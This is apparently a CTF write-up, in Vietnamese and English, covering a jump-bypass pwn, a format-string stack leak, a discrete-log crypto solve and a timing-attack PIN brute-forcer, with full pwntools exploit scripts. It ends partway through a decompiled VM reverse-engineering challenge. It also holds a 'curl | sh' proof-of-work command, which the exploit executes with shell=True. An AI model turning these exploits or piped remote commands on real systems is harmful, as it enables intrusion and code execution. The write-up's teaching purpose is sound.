V√¨ ƒë√£ c√≥ l·ªó h·ªïng **Arbitrary Call**, ch√∫ng ta kh√¥ng c·∫ßn x√¢y d·ª±ng chu·ªói ROP ph·ª©c t·∫°p. Ch√∫ng ta ch·ªâ c·∫ßn t√¨m m·ªôt v·ªã tr√≠ trong code (gadget) ƒë·ªÉ nh·∫£y t·ªõi.

Chi·∫øn thu·∫≠t: **Jump Bypass** (Nh·∫£y B·ªè Qua ƒêi·ªÅu Ki·ªán).

##### Chi ti·∫øt trong Assembly:

1.  **Ki·ªÉm tra ƒëi·ªÅu ki·ªán:**
    ```assembly
    00401979 81 bd dc ...    CMP dword ptr [RBP + local_12c],0xc0c0a ; So s√°nh param_1 v·ªõi 0xc0c0a
    00401983 0f 85 a8 ...    JNZ LAB_00401a31                        ; Nh·∫£y n·∫øu KH√îNG B·∫∞NG
    ```

2.  **Kh·ªëi ƒë·ªçc Flag (B·∫Øt ƒë·∫ßu sau l·ªánh `JNZ`):**
    ```assembly
    00401989 be 00 00 ...    MOV ESI,0x0                          ; Tham s·ªë 2 cho open (O_RDONLY)
    0040198e 48 8d 05 ...    LEA RAX,[s_manifest.bin_0049e030]    ; L·∫•y ƒë·ªãa ch·ªâ chu·ªói "manifest.bin"
    00401995 48 89 c7        MOV RDI,RAX                          ; Tham s·ªë 1 cho open
    0040199d e8 5e ab ...    CALL open                            ; G·ªçi open()
    ```

**ƒê·ªãa ch·ªâ C·∫ßn Nh·∫£y T·ªõi (Gadget):**
Ch√∫ng ta ch·ªçn l·ªánh ƒë·∫ßu ti√™n c·ªßa kh·ªëi ƒë·ªçc file:

$$\text{Jump Address} = \mathbf{0x401989}$$

#### 5. Khai th√°c (Exploitation)

Do b√†i n√†y kh√¥ng c·∫ßn t∆∞∆°ng t√°c ph·ª©c t·∫°p (ch·ªâ l√† m·ªôt l·∫ßn nh·∫≠p), ta c√≥ th·ªÉ gi·∫£i tr·ª±c ti·∫øp b·∫±ng tay (manual) ho·∫∑c m·ªôt script ƒë∆°n gi·∫£n:

**Khai th√°c th·ªß c√¥ng:**
1.  Ch·∫°y ch∆∞∆°ng tr√¨nh: `./a.out`
2.  Nh·∫≠p ƒë·ªãa ch·ªâ: `401989`
3.  Enter. Ch∆∞∆°ng tr√¨nh s·∫Ω th·ª±c thi kh·ªëi l·ªánh ƒë·ªçc file v√† in n·ªôi dung ra m√†n h√¨nh.

B√†i n√†y kh√¥ng c·∫ßn vi·∫øt script ph·ª©c t·∫°p nh∆∞ Pwn th√¥ng th∆∞·ªùng v√¨:
*   ƒê√£ l√† **No PIE**.
*   V·ªã tr√≠ nh·∫£y **ƒë√£ ƒë∆∞·ª£c t√¨m th·∫•y** (kh√¥ng c·∫ßn ROP Chain).
*   Ch·ªâ c·∫ßn **m·ªôt l·∫ßn nh·∫≠p** ƒë·ªÉ nh·∫£y t·ªõi ƒë√≠ch.

**Script:**
```python
from pwn import *

# p = remote('ip', port) 
p = process('./a.out') 

JUMP_ADDRESS = 0x401989 

p.recvuntil(b"DRONE FIRMWARE DEBUG CONSOLE> ")
p.sendline(hex(JUMP_ADDRESS))

p.interactive()
```

**Khi exploit tr√™n server ta ch·ªâ c·∫ßn PoW v√† d√πng c√°ch gi·∫£i t∆∞∆°ng t·ª± l√† xong**:

```bash
zenniskayy@ZennisKayy:~$ nc ctf.csd.lol 1001
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.qK72SXUDXUT/r6bj0oVeNQ==
solution: s.fKLovB1kEwmQRy46QNpGYrBjP/IhPxmhd36D6BcomPlBWce0b/zhuqKkYQWXjrxW05Mhk3/Dx1LEz2DVI8v0q5epmcsDXGvi9dnirtQz31HrsD+O+TToIs1DgO7535wm8B6yN3SKEjtsJqFj4YWNOOEAN+AbXfku2G+6JF0kxL/iZwA5jpVJcikCt6LI5nFRlsRLqIISiSjzeBVD/i303Q==
DRONE FIRMWARE DEBUG CONSOLE> 401989
KDNU3B-MANIFEST
format_version=2
fw_family=KDNU-DRONE-NAV
fw_id=kdnu3b-nav-autopilot
fw_version=1.7.24
build_branch=krampus-prod
build_id=2024-12-01T23:41:09Z
signing_key_id=NP-HSM-KEY-07
region_lock=GLOBAL
min_bootloader=0x00020005
image_offset=0x00004000
image_size=00036F80
hash_algo=sha256
image_hash=5f4c3f7d8f0b2737c0f5fd8e8da41c6b9e1372cbe9c6760e5d8e9e4f3d7c9b21
telemetry_profile=KDNU3B-TM-v4
calibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}
failsafe_mode=HARD_LOCKDOWN
debug_build=false
secure_boot=true
seal_status=SEALED

```

> **Flag:** `csd{3Asy_F1rmWAr3_HACk1N9_Fr}`
{: .prompt-flag }

ƒê√¢y l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh c·ªßa l·ªó h·ªïng **Arbitrary Call** k·∫øt h·ª£p v·ªõi **Jump Bypass** trong m√¥i tr∆∞·ªùng **Non-PIE** (kh√¥ng c√≥ ASLR), th∆∞·ªùng l√† m·ªôt trong nh·ªØng b√†i m·ªü ƒë·∫ßu trong danh m·ª•c Pwn.

---

## **Failed Exfil**

> **Category:** Pwnable
{: .prompt-info }

### 1. Ph√¢n t√≠ch (Analysis)
*   **File:** `collector` (ELF 64-bit, No PIE, Canary disabled).
*   **Logic ch√≠nh:**
    *   Ch∆∞∆°ng tr√¨nh t·∫°o m·ªôt s·ªë ng·∫´u nhi√™n 4-byte (`local_c`) b·∫±ng `rand()` ·ªü ƒë·∫ßu h√†m `main`.
    *   C√≥ 3 t√≠nh nƒÉng: `write` (ghi d·ªØ li·ªáu v√†o bi·∫øn to√†n c·ª•c), `read` (ƒë·ªçc d·ªØ li·ªáu), v√† `admin` (nh·∫≠p s·ªë `auth` ƒë·ªÉ l·∫•y flag).
*   **L·ªó h·ªïng (Vulnerability):**
    *   T·∫°i h√†m `handle_read`, ch∆∞∆°ng tr√¨nh g·ªçi `printf(collected_data)` tr·ª±c ti·∫øp m√† kh√¥ng c√≥ format specifier (`%s`).
    *   &rarr; **Format String Vulnerability**.
*   **M·ª•c ti√™u:**
    *   Khai th√°c l·ªói Format String ƒë·ªÉ ƒë·ªçc gi√° tr·ªã bi·∫øn `local_c` (Key) ƒëang n·∫±m tr√™n Stack.
    *   D√πng Key ƒë√≥ ƒë·ªÉ v∆∞·ª£t qua h√†m `handle_admin` v√† l·∫•y Flag.

### 2. Khai th√°c (Exploitation)
1.  **Trigger L·ªói:** D√πng l·ªánh `write` ƒë·ªÉ ghi payload ch·ª©a nhi·ªÅu k√Ω t·ª± `%p` (v√≠ d·ª•: `%p|%p|%p...`) v√†o b·ªô ƒë·ªám.
2.  **Leak Stack:** G·ªçi l·ªánh `read`. H√†m `printf` s·∫Ω in ra c√°c gi√° tr·ªã tr√™n Stack d∆∞·ªõi d·∫°ng Hex.
3.  **T√¨m Key:** Ph√¢n t√≠ch d·ªØ li·ªáu tr·∫£ v·ªÅ. Key l√† m·ªôt s·ªë nguy√™n ng·∫´u nhi√™n (4 bytes), th∆∞·ªùng n·∫±m l·∫´n gi·ªØa c√°c ƒë·ªãa ch·ªâ b·ªô nh·ªõ (`0x7fff...` ho·∫∑c `0x40...`). Do ki·∫øn tr√∫c 64-bit, ƒë√¥i khi gi√° tr·ªã n√†y b·ªã gh√©p chung v·ªõi bi·∫øn kh√°c, c·∫ßn t√°ch ra (masking).
4.  **Get Flag:** L·∫•y s·ªë nguy√™n t√¨m ƒë∆∞·ª£c, g·ª≠i v√†o l·ªánh `admin`.

### Script t√≥m t·∫Øt (Payload Logic)
```python
# 1. G·ª≠i payload Format String
r.sendline(b"write")
r.sendline(b"%p|" * 40)

# 2. Leak d·ªØ li·ªáu
r.sendline(b"read")
leak = r.recvline()

# 3. Parse v√† Brute-force key
# L·ªçc c√°c gi√° tr·ªã kh√¥ng ph·∫£i ƒë·ªãa ch·ªâ Stack/Heap/Code
# Th·ª≠ t·ª´ng gi√° tr·ªã int t√¨m ƒë∆∞·ª£c v·ªõi t√≠nh nƒÉng admin
for key in potential_keys:
    r.sendline(b"admin")
    r.sendline(str(key))
    # Check flag...
```

### Full script

```python
from pwn import *
import subprocess
import struct

HOST = 'ctf.csd.lol'
PORT = 7777
BINARY = './collector'

context.log_level = 'debug'

def solve():
    p = remote(HOST, PORT)

    initial_data = p.recv(4096, timeout=3)
    
    if b'proof of work' in initial_data:
        lines = initial_data.decode().split('\n')
        cmd = ""
        for line in lines:
            if line.strip().startswith('curl'):
                cmd = line.strip()
                break
        
        if cmd:
            try:
                solution = subprocess.check_output(cmd, shell=True).strip()
                print(f"[+] PoW Solution: {solution.decode()}")
                p.sendline(solution)
                p.recvuntil(b"cmd: ", timeout=5)
            except Exception as e:
                print(f"[-] PoW Error: {e}")
                return
    else:
        if b'cmd: ' not in initial_data:
            p.recvuntil(b"cmd: ")

    # --- LEAK DATA ---
    print("[*] Sending Format String payload...")
    
    # Send a bit more %p and use | as delimiter
    payload = b"%p|" * 45
    
    p.sendline(b"write")
    p.recvuntil(b"data: ")
    p.sendline(payload)
    
    p.recvuntil(b"cmd: ")
    p.sendline(b"read")
    
    p.recvuntil(b"data:\n")
    leak_line = p.recvline().decode().strip()
    print(f"[+] Leak received: {leak_line[:50]}...")
    
    values = leak_line.split('|')
    
    # --- FOUND KEY (AGGRESSIVE STRATEGY) ---
    potential_keys = []
    
    print("[*] Analyzing Stack...")
    for i, val in enumerate(values):
        if not val or val == '(nil)': continue
        if val.startswith('0x7f'): continue # Skip Stack/Libc addresses
        
        try:
            int_val = int(val, 16)
            
            # Key is a 32-bit int, so the maximum is 0xFFFFFFFF (4 billion)
            # However, on a 64-bit stack, it may appear as a larger number
            
            # CASE 1: Number fits entirely (less than 32-bit max)
            if int_val <= 0xFFFFFFFF:
                # Filter out numbers that are too small (like 0, 1, 5) unless desperate
                if int_val > 100: 
                    potential_keys.append(int_val)
            
            # CASE 2: Number is packed with another (Packed in 64-bit)
            else:
                # Lower 32-bits
                low_32 = int_val & 0xFFFFFFFF
                # Upper 32-bits
                high_32 = (int_val >> 32) & 0xFFFFFFFF
                
                if low_32 > 100: potential_keys.append(low_32)
                if high_32 > 100: potential_keys.append(high_32)

        except:
            pass

    # Remove duplicates while preserving order
    unique_keys = []
    [unique_keys.append(x) for x in potential_keys if x not in unique_keys]
    
    print(f"[*] Found {len(unique_keys)} potential keys. Starting brute-force...")
    print(f"[*] Key list: {unique_keys}")

    # --- TRY KEYS ---
    for key in unique_keys:
        # Send admin command
        p.sendline(b"admin")
        
        # Handle potential line drift
        try:
            p.recvuntil(b"auth: ", timeout=1)
        except:
            p.clean()
        
        p.sendline(str(key).encode())
        
        response = p.recvline().decode()
        
        if "denied" in response:
            # If wrong, server returns to cmd, need to read and discard the cmd line
            p.recvuntil(b"cmd: ")
        else:
            print("\n" + "="*30)
            print(" [!!!] FOUND FLAG [!!!]")
            print("="*30)
            print(response)
            try:
                print(p.recvall(timeout=2).decode())
            except:
                pass
            return

    print("[-] Tried all keys but failed. Could be due to lag or offset change.")
    p.close()

if __name__ == "__main__":
    solve()
```

> **Flag:** `csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}`
{: .prompt-flag }

---

## Log Folly
> **Category:** Cryptography
{: .prompt-info }

### 1. Ph√¢n t√≠ch b√†i to√°n
Ch√∫ng ta ƒë∆∞·ª£c cung c·∫•p m·ªôt ƒëo·∫°n code Python (`chall.py`) v√† m·ªôt file output (`out.txt`).

**Quy tr√¨nh ho·∫°t ƒë·ªông c·ªßa code:**
1.  T·∫°o m·ªôt s·ªë nguy√™n t·ªë $p$ (256-bit) v√† generator $g=2$.
2.  L·∫∑p qua ƒë·ªô d√†i c·ªßa `FLAG`:
    *   Chuy·ªÉn `FLAG` hi·ªán t·∫°i th√†nh s·ªë nguy√™n `x`.
    *   T√≠nh $h = g^x \pmod p$ (ƒë√¢y l√† b√†i to√°n Discrete Logarithm).
    *   In ra gi√° tr·ªã $h$ (leak).
    *   **Rotate:** Xoay tr√°i chu·ªói `FLAG` 1 k√Ω t·ª± (k√Ω t·ª± ƒë·∫ßu chuy·ªÉn xu·ªëng cu·ªëi).

**Nh·∫≠n ƒë·ªãnh:**
*   V√¨ $p$ l·ªõn (256-bit), ta kh√¥ng th·ªÉ gi·∫£i tr·ª±c ti·∫øp b√†i to√°n Discrete Logarithm ƒë·ªÉ t√¨m $x$ t·ª´ $h$.
*   Tuy nhi√™n, c√°c gi√° tr·ªã $x$ li√™n ti·∫øp c√≥ m·ªëi quan h·ªá to√°n h·ªçc ch·∫∑t ch·∫Ω do ph√©p xoay chu·ªói (rotate). Ch√∫ng ta s·∫Ω t·∫•n c√¥ng v√†o m·ªëi quan h·ªá n√†y.

### 2. Ph√¢n t√≠ch to√°n h·ªçc

G·ªçi $L$ l√† ƒë·ªô d√†i c·ªßa FLAG.
G·ªçi $x_i$ l√† gi√° tr·ªã s·ªë nguy√™n c·ªßa FLAG ·ªü b∆∞·ªõc th·ª© $i$.
G·ªçi $c_i$ l√† k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa FLAG ·ªü b∆∞·ªõc th·ª© $i$ (ƒë√¢y ch√≠nh l√† k√Ω t·ª± s·∫Ω b·ªã ƒë·∫©y xu·ªëng cu·ªëi).

C√¥ng th·ª©c chuy·ªÉn ƒë·ªïi t·ª´ chu·ªói sang s·ªë v√† ph√©p xoay tr√°i (v·ªõi c∆° s·ªë 256) l√†:
$$x_{i+1} = (x_i \cdot 256) - (c_i \cdot 256^L) + c_i$$

R√∫t g·ªçn l·∫°i:
$$x_{i+1} = 256 \cdot x_i - c_i \cdot (256^L - 1)$$

√Åp d·ª•ng v√†o ph√©p t√≠nh leak $h = g^x \pmod p$:
$$h_{i+1} = g^{x_{i+1}} \pmod p$$
$$h_{i+1} = g^{(256 \cdot x_i - c_i \cdot (256^L - 1))} \pmod p$$

T√°ch s·ªë m≈© ra:
$$h_{i+1} = (g^{x_i})^{256} \cdot (g^{256^L - 1})^{-c_i} \pmod p$$
$$h_{i+1} = h_i^{256} \cdot (g^{256^L - 1})^{-c_i} \pmod p$$

ƒê·∫∑t h·∫±ng s·ªë $B = g^{(256^L - 1)} \pmod p$. Ph∆∞∆°ng tr√¨nh tr·ªü th√†nh:
$$h_{i+1} = h_i^{256} \cdot B^{-c_i} \pmod p$$

M·ª•c ti√™u c·ªßa ch√∫ng ta l√† t√¨m $c_i$ (k√Ω t·ª± b·ªã xoay). Ta bi·∫øn ƒë·ªïi ph∆∞∆°ng tr√¨nh ƒë·ªÉ c√¥ l·∫≠p $B^{c_i}$:
$$B^{c_i} = h_i^{256} \cdot (h_{i+1})^{-1} \pmod p$$

### 3. Chi·∫øn thu·∫≠t t·∫•n c√¥ng

1.  **X√°c ƒë·ªãnh $L$:** ƒê·∫øm s·ªë l∆∞·ª£ng d√≤ng leak trong file `out.txt`.
2.  **T√≠nh h·∫±ng s·ªë $B$:** $B = 2^{(256^L - 1)} \pmod p$. (L∆∞u √Ω: s·ªë m≈© ph·∫£i t√≠nh theo modulo $p-1$ theo ƒë·ªãnh l√Ω Fermat nh·ªè).
3.  **Brute-force k√Ω t·ª±:**
    *   V·ªõi m·ªói c·∫∑p leak li√™n ti·∫øp $(h_i, h_{i+1})$, t√≠nh gi√° tr·ªã ƒë√≠ch: $Target = h_i^{256} \cdot h_{i+1}^{-1} \pmod p$.
    *   V√¨ $c_i$ l√† m·ªôt byte (0-255), ta ch·ªâ c·∫ßn th·ª≠ c√°c gi√° tr·ªã $k$ t·ª´ 0 ƒë·∫øn 255.
    *   N·∫øu $B^k \equiv Target \pmod p$, th√¨ $k$ ch√≠nh l√† k√Ω t·ª± $c_i$.

### Script

```python
from Crypto.Util.number import inverse

p = 105891552782768273485439811488443354235545023673195353053856843893816480862271
g = 2

leaks = [
    74834831693148489075053741970537349864361072646438063822128523522624111096404,
    94637262384206414487913618520407895315549149001067603290715492338419957063638,
    26119415647812686814124878968032828750956202141747974248626227495752618826310,
    4679774184271053791528196045893972569586759227111353536533198888487507918565,
    18247264710550364407701539407739806326963229364366084285259750379893601861765,
    57915316904508068959154652733100932636576891111709785240327600448742235657223,
    48726379408397107751482798948037834170753506073391626907440435722452593080790,
    23985113650578780235980433910057970681859494895610853985857472866552793069375,
    79231016211481853602891211467430186947199626871048819648312025046281485147965,
    1741002057862179063516105232753064091765321308410446556962767548042727938590,
    45723548930603031191234669145592632467258468694483505689072179691228438466667,
    58359671511194341930052508512801343119287048085288142869480583778613556216586,
    36424897628935082604512568766716569943269039796337573854278402880102811617963,
    74124749341279711257845847090110538409556405630352757105373182076739304300759,
    66309699088883552645305984224828051437638962884903042514430099711503266344026,
    3162806651485565481013375199103880408462676315825209573632289159416883750178,
    38582718538740737041784799604514668813686704870272183643601445048856770639975,
    60816150467494956825800367310063997854145812297158134406617773585762215516843,
    12353526085228982771214476339845069964525380861405349768474892062968628975241,
    105582281937486445268146775233874434792742700624750876452894760571703935174919,
    13238662997179930853908762356537888264584682314391321882412877512234731316348,
    75875040959123636492014257513993145046661183624855640826292741601485403285328,
    12149947150174642792165286320748309835337741992502616190760701133669565860666,
    38650263185329843052214216132708910216830022007692554045491912295950867554552,
    92561547647296020081423003558701351791204280991353765906671600253604516771598,
    41349557324733447344437570514434312589869408427300508224464407246422794992797,
    86385180739170312287865404316483035605934760491085055759657242983443484861082,
    39348401982172687025128116440936094277482944374061555213943911942008513049037,
    58273481812023054183980778217247474508696785731672888895966172242039774561634,
    69932445711823749013619544296257448424270930795659726110506648765574551496961,
    11196151841801624492550269516119227591456953234837751240484968196644961160377,
    26041577455573938646072969268840197244828691423833869416465901173451675328995,
]

L = len(leaks)

# T√≠nh B = g^(256^L - 1) mod p
# S·ªë m≈© c·∫ßn t√≠nh modulo (p-1) theo ƒë·ªãnh l√Ω Fermat nh·ªè
exponent = (pow(256, L, p-1) - 1)
B = pow(g, exponent, p)

# T·∫°o b·∫£ng tra c·ª©u (Rainbow table nh·ªè) cho c√°c k√Ω t·ª± in ƒë∆∞·ª£c
lookup = {}
for char_code in range(32, 127): # ASCII printable
    val = pow(B, char_code, p)
    lookup[val] = chr(char_code)

flag = ""

for i in range(L):
    h_current = leaks[i]
    # Ph·∫ßn t·ª≠ k·∫ø ti·∫øp (xoay v√≤ng v·ªÅ ƒë·∫ßu n·∫øu l√† ph·∫ßn t·ª≠ cu·ªëi)
    h_next = leaks[(i + 1) % L]
    
    # C√¥ng th·ª©c: B^c = h_i^256 * h_{i+1}^-1 mod p
    term1 = pow(h_current, 256, p)
    term2 = inverse(h_next, p)
    target = (term1 * term2) % p
    
    if target in lookup:
        flag += lookup[target]
    else:
        flag += "?" # Kh√¥ng t√¨m th·∫•y k√Ω t·ª± ph√π h·ª£p
        
print("FLAG:", flag)
```
> **Flag:** `csd{n0t_s0_unbr34k4bl3_bc3e9f1c}`
{: .prompt-flag }

---

## Time To Escalate

> **Category:** Misc / Timing Attack
{: .prompt-info}

### 1. Th√¥ng tin b√†i to√°n
*   **T√™n b√†i:** Time To Escalate
*   **M√¥ t·∫£:** H·ªá th·ªëng ƒëi·ªÅu khi·ªÉn thang m√°y y√™u c·∫ßu m√£ PIN 4 ch·ªØ s·ªë (th·ª±c t·∫ø khi k·∫øt n·ªëi l√† 6 ch·ªØ s·ªë). N·∫øu nh·∫≠p sai, h·ªá th·ªëng s·∫Ω b·ªã kh√≥a (lockout) trong 3 gi√¢y. G·ª£i √Ω cho bi·∫øt h·ªá th·ªëng x·ª≠ l√Ω l√¢u h∆°n b√¨nh th∆∞·ªùng khi nh·∫≠p ƒë√∫ng m√£ PIN.
*   **Server:** `ctf.csd.lol:5040`

### 2. Ph√¢n t√≠ch (Reconnaissance)
Khi k·∫øt n·ªëi ƒë·∫øn server b·∫±ng `netcat`, ta nh·∫≠n ƒë∆∞·ª£c giao di·ªán sau:

```bash
$ nc ctf.csd.lol 5040
...
AUTH: 6-digit PIN required for emergency release
WARNING: 3-second lockout between attempts
...
[Attempt 1/100] Enter 6-digit PIN: 123456
‚úó ACCESS DENIED (Debug: 0.389s)
```

**Nh·∫≠n ƒë·ªãnh quan tr·ªçng:**
1.  **C∆° ch·∫ø kh√≥a:** N·∫øu brute-force th√¥ng th∆∞·ªùng ($10^6$ tr∆∞·ªùng h·ª£p), th·ªùi gian ch·ªù 3 gi√¢y m·ªói l·∫ßn sai l√† b·∫•t kh·∫£ thi.
2.  **L·ªó h·ªïng (Information Leak):** Server tr·∫£ v·ªÅ th·ªùi gian x·ª≠ l√Ω ch√≠nh x√°c th√¥ng qua d√≤ng `(Debug: 0.389s)`.
3.  **Gi·∫£ thuy·∫øt:** H·ªá th·ªëng ki·ªÉm tra m√£ PIN t·ª´ng k√Ω t·ª± m·ªôt (character-by-character comparison).
    *   N·∫øu k√Ω t·ª± ƒë·∫ßu ti√™n sai $\rightarrow$ Tr·∫£ v·ªÅ l·ªói ngay l·∫≠p t·ª©c (Th·ªùi gian th·∫•p).
    *   N·∫øu k√Ω t·ª± ƒë·∫ßu ti√™n ƒë√∫ng $\rightarrow$ ƒêi ti·∫øp ki·ªÉm tra k√Ω t·ª± th·ª© 2 (Th·ªùi gian x·ª≠ l√Ω tƒÉng l√™n).

$\rightarrow$ ƒê√¢y l√† d·∫°ng b√†i **Side-Channel Attack** (t·∫•n c√¥ng k√™nh k·ªÅ), c·ª• th·ªÉ l√† khai th√°c th·ªùi gian x·ª≠ l√Ω (Timing Attack).

### 3. Chi·∫øn thu·∫≠t khai th√°c
Thay v√¨ ƒëo√°n to√†n b·ªô chu·ªói, ta s·∫Ω ƒëo√°n t·ª´ng ch·ªØ s·ªë (Digit-by-digit):

1.  Gi·ªØ m·ªôt k·∫øt n·ªëi duy nh·∫•t (ƒë·ªÉ t·∫≠n d·ª•ng 100 l·∫ßn th·ª≠ v√† tr√°nh vi·ªác PIN b·ªã reset).
2.  T·∫°i v·ªã tr√≠ ƒë·∫ßu ti√™n (index 0), th·ª≠ t·ª´ `0` ƒë·∫øn `9`.
3.  Ghi nh·∫≠n gi√° tr·ªã `Debug time` server tr·∫£ v·ªÅ.
4.  S·ªë n√†o c√≥ th·ªùi gian x·ª≠ l√Ω **cao nh·∫•t** (ƒë·ªôt bi·∫øn so v·ªõi c√°c s·ªë c√≤n l·∫°i) ch√≠nh l√† s·ªë ƒë√∫ng.
5.  C·ªë ƒë·ªãnh s·ªë ƒë√∫ng ƒë√≥, chuy·ªÉn sang t√¨m v·ªã tr√≠ ti·∫øp theo.
6.  L·∫∑p l·∫°i cho ƒë·∫øn khi t√¨m ƒë·ªß 6 s·ªë.

### 4. Exploit Script
S·ª≠ d·ª•ng Python v√† th∆∞ vi·ªán `pwntools`. Script t·ª± ƒë·ªông ph√¢n t√≠ch th·ªùi gian `Debug` v√† x·ª≠ l√Ω tr∆∞·ªùng h·ª£p server ƒë√≥ng k·∫øt n·ªëi khi nh·∫≠n ƒë∆∞·ª£c Flag (`EOFError`).

```python
from pwn import *
import re

# C·∫•u h√¨nh
HOST = 'ctf.csd.lol'
PORT = 5040
context.log_level = 'error'  # T·∫Øt log h·ªá th·ªëng ƒë·ªÉ d·ªÖ nh√¨n k·∫øt qu·∫£

def solve():
    print(f"[*] ƒêang k·∫øt n·ªëi ƒë·∫øn {HOST}:{PORT}...")
    try:
        r = remote(HOST, PORT)
    except:
        print("[!] L·ªói k·∫øt n·ªëi. Ki·ªÉm tra m·∫°ng/VPN.")
        return

    # B·ªè qua banner ban ƒë·∫ßu
    r.recvuntil(b'PIN:')

    known_pin = ""
    print("[*] B·∫Øt ƒë·∫ßu t·∫•n c√¥ng Timing Attack d·ª±a tr√™n Debug info...")

    # L·∫∑p qua 6 v·ªã tr√≠ c·ªßa m√£ PIN
    for position in range(6):
        max_time = -1.0
        best_digit = None
        
        # Th·ª≠ c√°c s·ªë t·ª´ 0-9
        for digit in "0123456789":
            # T·∫°o payload: S·ªë ƒë√£ bi·∫øt + s·ªë ƒëang th·ª≠ + ƒëi·ªÅn ƒë·∫ßy s·ªë 0
            padding = "0" * (5 - len(known_pin))
            current_guess = known_pin + digit + padding
            
            # G·ª≠i m√£ PIN
            r.sendline(current_guess.encode())
            
            try:
                # ƒê·ªçc ph·∫£n h·ªìi cho ƒë·∫øn khi server h·ªèi PIN l·∫ßn ti·∫øp theo
                # drop=False ƒë·ªÉ gi·ªØ l·∫°i d·ªØ li·ªáu trong buffer
                response = r.recvuntil(b'PIN:', drop=False).decode(errors='ignore')
            
            except EOFError:
                # N·∫æU G·∫∂P EOF ERROR -> ƒê√É G·ª¨I ƒê√öNG M√É PIN CU·ªêI C√ôNG
                # Server g·ª≠i Flag xong v√† ƒë√≥ng k·∫øt n·ªëi n√™n kh√¥ng c√≤n chu·ªói "PIN:" ƒë·ªÉ ƒë·ª£i
                print(f"\n[!!!] Bingo! Server ƒë√≥ng k·∫øt n·ªëi t·∫°i m√£: {current_guess}")
                print("[+] ƒêang l·∫•y Flag t·ª´ buffer...")
                
                # ƒê·ªçc n·ªët d·ªØ li·ªáu c√≤n s√≥t l·∫°i
                flag_data = r.recvall().decode(errors='ignore')
                print("\n" + "="*50)
                print(flag_data.strip())
                print("="*50 + "\n")
                return

            # Ph√¢n t√≠ch th·ªùi gian t·ª´ chu·ªói "(Debug: x.xxxs)"
            match = re.search(r"Debug:\s+([0-9\.]+)", response)
            if match:
                server_time = float(match.group(1))
                print(f"   Th·ª≠ '{current_guess}' -> Time: {server_time}s")
                
                # T√¨m th·ªùi gian l·ªõn nh·∫•t
                if server_time > max_time:
                    max_time = server_time
                    best_digit = digit
            else:
                # Tr∆∞·ªùng h·ª£p kh√¥ng th·∫•y debug time (c√≥ th·ªÉ l√† in ra flag lu√¥n)
                if "csd{" in response.lower():
                    print(response)
                    return

        # K·∫øt th√∫c v√≤ng l·∫∑p 0-9, ch·ªët s·ªë ƒë√∫ng
        if best_digit:
            known_pin += best_digit
            print(f"--> [LOCK] V·ªã tr√≠ {position+1} l√†: {best_digit} (Time: {max_time}s)")
            print(f"--> PIN hi·ªán t·∫°i: {known_pin}\n")
        else:
            print("[X] Kh√¥ng t√¨m th·∫•y s·ªë ph√π h·ª£p.")
            break
            
    r.close()

if __name__ == "__main__":
    solve()
```

### 5. K·∫øt qu·∫£
Khi ch·∫°y script, ta th·∫•y s·ª± ch√™nh l·ªách r√µ r√†ng v·ªÅ th·ªùi gian x·ª≠ l√Ω:
*   S·ªë sai: ~0.38s
*   S·ªë ƒë√∫ng (v·ªã tr√≠ 1): ~0.70s
*   S·ªë ƒë√∫ng (v·ªã tr√≠ 2): ~1.03s
*   ... tƒÉng d·∫ßn ...

Cu·ªëi c√πng, khi g·ª≠i m√£ PIN ƒë√∫ng ho√†n to√†n, server tr·∫£ v·ªÅ Flag:

> **Flag:** `csd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}`
{: .prompt-flag}

---

## **Jingle's Validator**

> **Category:** Reverse Engineering
{: .prompt-info }

This is a classic Reverse Engineering challenge based on a **Virtual Machine (VM)**. The C code does not contain the direct validation logic; instead, it acts as a custom "processor" (CPU) that executes "bytecode" stored within the executable file.

### **Initial Analysis: Identifying the VM Architecture**

By examining the `FUN_001011c9` function, we can identify the core components of the virtual machine:
```c
undefined8 FUN_001011c9(void)

{
  byte bVar1;
  ushort uVar2;
  bool bVar3;
  char *pcVar4;
  size_t sVar5;
  undefined8 uVar6;
  uint uVar7;
  long lVar8;
  ulong uVar9;
  uint unaff_EBX;
  byte *pbVar10;
  byte **ppbVar11;
  uint *puVar12;
  long in_FS_OFFSET;
  bool bVar13;
  byte bVar14;
  uint local_3a8 [9];
  undefined4 local_384;
  byte *local_368;
  undefined *local_360;
  undefined8 local_358;
  undefined8 local_350;
  byte abStack_348 [256];
  undefined4 local_248;
  uint local_244;
  char local_238 [256];
  byte local_138 [264];
  long local_30;
  
  bVar14 = 0;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  puts("[*] NPLD Tool Suite v2.4.1");
  __printf_chk(1,"Enter license key: ");
  pcVar4 = fgets(local_238,0x100,stdin);
  if (pcVar4 == (char *)0x0) {
    uVar6 = 1;
  }
  else {
    sVar5 = strcspn(local_238,"\n");
    local_238[sVar5] = '\0';
    if (sVar5 == 0x34) {
      pcVar4 = local_238;
      pbVar10 = local_138;
      for (lVar8 = 0xd; lVar8 != 0; lVar8 = lVar8 + -1) {
        *(undefined4 *)pbVar10 = *(undefined4 *)pcVar4;
        pcVar4 = pcVar4 + ((ulong)bVar14 * -2 + 1) * 4;
        pbVar10 = pbVar10 + ((ulong)bVar14 * -2 + 1) * 4;
      }
      ppbVar11 = &local_368;
      for (lVar8 = 0x25; lVar8 != 0; lVar8 = lVar8 + -1) {
        *ppbVar11 = (byte *)0x0;
        ppbVar11 = ppbVar11 + (ulong)bVar14 * -2 + 1;
      }
      local_368 = local_138;
      local_360 = &DAT_001020e0;
      local_358 = 0x34;
      local_350 = 0x34;
      local_248 = 0xf337;
      puVar12 = local_3a8;
      for (lVar8 = 0xd; lVar8 != 0; lVar8 = lVar8 + -1) {
        *puVar12 = 0;
        puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
      }
      local_3a8[0] = 0x34;
      local_384 = 0xf337;
      bVar3 = false;
      bVar13 = false;
      uVar9 = 0;
      do {
        lVar8 = uVar9 * 6;
        bVar14 = (&DAT_00102121)[lVar8];
        bVar1 = (&DAT_00102122)[lVar8];
        uVar2 = (&DAT_00102124)[uVar9 * 3];
        switch((&DAT_00102120)[lVar8]) {
        case 0:
          local_3a8[bVar14] = (int)(short)uVar2;
          break;
        case 1:
          local_3a8[bVar14] = local_3a8[bVar1];
          break;
